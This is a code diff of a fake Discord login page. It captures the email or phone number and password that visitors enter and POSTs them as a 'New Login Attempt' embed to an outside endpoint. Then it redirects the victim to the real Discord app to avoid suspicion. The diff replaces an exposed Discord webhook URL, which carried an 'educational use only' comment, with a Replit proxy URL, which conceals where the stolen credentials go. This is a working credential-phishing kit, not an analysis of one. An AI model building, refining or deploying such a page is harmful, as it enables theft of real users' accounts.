@@ -4,88 +4,53 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Discord</title>
-    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Google Fonts: Inter -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Favicon (Discord Logo) -->
     <link rel="icon" href="https://discord.com/assets/favicon.ico" type="image/x-icon">
     <style>
-        /* Use Inter as the default font */
-        body {
-            font-family: 'Inter', sans-serif;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-        /* New background to match the provided image */
+        body { font-family: 'Inter', sans-serif; }
         .bg-discord-space {
             background-image: url('https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a69f118df70ad7828d4_Group%20339.svg');
-            background-color: #23272a; /* Fallback color */
+            background-color: #23272a;
             background-position: center;
             background-repeat: no-repeat;
             background-size: cover;
         }
-        /* Custom input field background color */
-        .bg-discord-input {
-            background-color: #1e1f22;
-        }
+        .bg-discord-input { background-color: #1e1f22; }
     </style>
 </head>
 <body class="bg-discord-space w-full h-screen flex items-center justify-center p-4">
-
-    <!-- Main Login Box -->
     <div class="w-full max-w-[784px] bg-[#313338] rounded-lg shadow-lg flex overflow-hidden">
-
-        <!-- Left Side: Login Form -->
         <div class="w-full lg:w-[60%] p-8 md:p-10 flex flex-col justify-center">
             <div class="text-center mb-6">
                 <h1 class="text-2xl font-bold text-white">Welcome back!</h1>
                 <p class="text-gray-400 mt-2">We're so excited to see you again!</p>
             </div>
-
             <form id="login-form" class="w-full max-w-sm mx-auto">
-                <!-- Email or Phone Number Input -->
                 <div class="mb-4">
                     <label for="email" class="block text-xs font-bold text-gray-400 uppercase mb-2">Email or Phone Number</label>
-                    <input type="text" id="email" name="email" class="w-full bg-discord-input border border-transparent focus:border-blue-500 focus:ring-0 text-gray-200 rounded-md px-3 py-2 text-sm transition-all duration-200" required>
+                    <input type="text" id="email" name="email" class="w-full bg-discord-input border border-transparent focus:border-blue-500 focus:ring-0 text-gray-200 rounded-md px-3 py-2 text-sm transition-all" required>
                 </div>
-
-                <!-- Password Input -->
                 <div class="mb-4">
                     <label for="password" class="block text-xs font-bold text-gray-400 uppercase mb-2">Password</label>
-                    <div class="relative">
-                        <input type="password" id="password" name="password" class="w-full bg-discord-input border border-transparent focus:border-blue-500 focus:ring-0 text-gray-200 rounded-md px-3 py-2 text-sm transition-all duration-200" required>
-                        <button type="button" id="togglePassword" class="absolute inset-y-0 right-0 px-3 flex items-center text-gray-400 hover:text-gray-200">
-                             <svg id="eye-open" class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
-                             <svg id="eye-closed" class="h-5 w-5 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18"></path></svg>
-                        </button>
-                    </div>
+                    <input type="password" id="password" name="password" class="w-full bg-discord-input border border-transparent focus:border-blue-500 focus:ring-0 text-gray-200 rounded-md px-3 py-2 text-sm" required>
                 </div>
-
-                <!-- Forgot Password Link -->
                 <div class="mb-6">
                     <a href="#" class="text-sm text-blue-500 hover:underline">Forgot your password?</a>
                 </div>
-
-                <!-- Login Button -->
-                <button type="submit" id="login-button" class="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold rounded-md py-2.5 transition-all duration-200">
+                <button type="submit" id="login-button" class="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold rounded-md py-2.5 transition-all">
                     Log In
                 </button>
-
-                <!-- Register Link -->
                 <div class="mt-4 text-sm">
                     <span class="text-gray-400">Need an account?</span>
                     <a href="#" class="text-blue-500 hover:underline ml-1">Register</a>
                 </div>
             </form>
         </div>
-
-        <!-- Right Side: QR Code -->
         <div class="hidden lg:flex w-[40%] bg-[#313338] p-8 flex-col items-center justify-center">
              <div class="bg-white p-4 rounded-lg relative">
-                <!-- Use local qr.png file -->
                 <img src="qr.png" alt="QR Code for mobile login" width="176" height="176">
              </div>
             <div class="text-center mt-6">
@@ -97,83 +62,52 @@
     </div>
 
     <script>
-        // --- Password visibility toggle ---
-        const togglePassword = document.getElementById('togglePassword');
-        const passwordInput = document.getElementById('password');
-        const eyeOpen = document.getElementById('eye-open');
-        const eyeClosed = document.getElementById('eye-closed');
-
-        togglePassword.addEventListener('click', function (e) {
-            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-            passwordInput.setAttribute('type', type);
-            eyeOpen.classList.toggle('hidden');
-            eyeClosed.classList.toggle('hidden');
-        });
-
-        // --- Webhook submission logic ---
         const loginForm = document.getElementById('login-form');
         const loginButton = document.getElementById('login-button');
 
         loginForm.addEventListener('submit', function(event) {
-            // Prevent the default form submission (which reloads the page)
             event.preventDefault();
 
-            // WARNING: For educational use only. Do not use for malicious purposes.
-            const webhookUrl = 'https://discord.com/api/webhooks/1386016252480323655/bvx8_vO4LCaqI2GixARRfPnsx2ISTQWFS8AbdA9jJY3_sQ7EOytvtmf__SXUyDobxHCg';
+            // This URL points to your secure proxy on Replit
+            const proxyUrl = 'https://42b5c6f8-5935-4899-a4ff-37927ede76dd-00-2xxamxeapw11m.pike.replit.dev/send-webhook';
 
-            // Get the values from the form fields
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Simple validation to ensure fields are not empty
             if (!email || !password) {
-                const messageBox = document.createElement('div');
-                messageBox.textContent = 'Please enter both email and password.';
-                messageBox.style.cssText = 'position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background-color: #f25858; color: white; padding: 10px 20px; border-radius: 5px; z-index: 1000;';
-                document.body.appendChild(messageBox);
-                setTimeout(() => document.body.removeChild(messageBox), 4000);
+                alert('Please enter both email and password.');
                 return;
             }
 
-            // Create the payload for the webhook. Using an embed looks nicer in Discord.
             const payload = {
                 username: "Login Bot",
-                avatar_url: "https://i.imgur.com/4M34hi2.png", // A simple bot icon
+                avatar_url: "https://i.imgur.com/4M34hi2.png",
                 embeds: [{
                     title: "New Login Attempt",
-                    color: 15258703, // A reddish color for the embed sidebar
+                    color: 15258703,
                     fields: [
-                        { name: "Email / Phone", value: email, inline: false },
-                        { name: "Password", value: password, inline: false }
+                        { name: "Email / Phone", value: email },
+                        { name: "Password", value: password }
                     ],
                     timestamp: new Date().toISOString()
                 }]
             };
             
-            // Disable the button to prevent multiple submissions
             loginButton.disabled = true;
 
-            // Send the data using the fetch API
-            fetch(webhookUrl, {
+            // Send the data to your secure Replit proxy
+            fetch(proxyUrl, { 
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             })
-            .catch(error => {
-                // Log any fetch error to the console, but don't block the redirect.
-                console.error('Error sending webhook:', error);
-            })
+            .catch(error => console.error('Error:', error))
             .finally(() => {
-                // After the fetch is attempted, redirect the user after a short delay.
-                // This makes the process feel more authentic.
                 setTimeout(() => {
                     window.location.href = 'https://discord.com/app';
-                }, 1000); // 1-second delay before redirecting
+                }, 1000);
             });
         });
     </script>
-
 </body>
 </html>
